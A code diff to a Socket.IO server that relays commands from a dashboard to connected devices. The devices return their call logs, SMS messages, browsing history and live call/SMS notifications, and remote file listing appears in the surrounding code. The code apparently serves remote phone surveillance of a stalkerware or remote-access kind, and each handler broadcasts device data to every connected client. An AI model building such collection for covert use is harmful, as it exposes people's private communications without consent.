@@ -199,6 +199,62 @@ io.on('connection', (socket) => {
     });
   });
 
+  // Dashboard requests call log
+  socket.on('command:calllog:fetch', ({ deviceId }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:calllog:fetch');
+    }
+  });
+
+  // Device sends call log
+  socket.on('calllog:data', (data) => {
+    socket.broadcast.emit('calllog:data', {
+      deviceId: socket.deviceId,
+      ...data
+    });
+  });
+
+  // Dashboard requests SMS
+  socket.on('command:sms:fetch', ({ deviceId }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:sms:fetch');
+    }
+  });
+
+  // Device sends SMS data
+  socket.on('sms:data', (data) => {
+    socket.broadcast.emit('sms:data', {
+      deviceId: socket.deviceId,
+      ...data
+    });
+  });
+
+  // Dashboard requests browsing history
+  socket.on('command:history:fetch', ({ deviceId }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:history:fetch');
+    }
+  });
+
+  // Device sends history data
+  socket.on('history:data', (data) => {
+    socket.broadcast.emit('history:data', {
+      deviceId: socket.deviceId,
+      ...data
+    });
+  });
+
+  // Device sends real-time notification (call/sms)
+  socket.on('notification:new', (data) => {
+    socket.broadcast.emit('notification:new', {
+      deviceId: socket.deviceId,
+      ...data
+    });
+  });
+
   // Dashboard requests file listing
   socket.on('command:files:list', ({ deviceId, path: dirPath }) => {
     const targetSocketId = deviceSockets.get(deviceId);
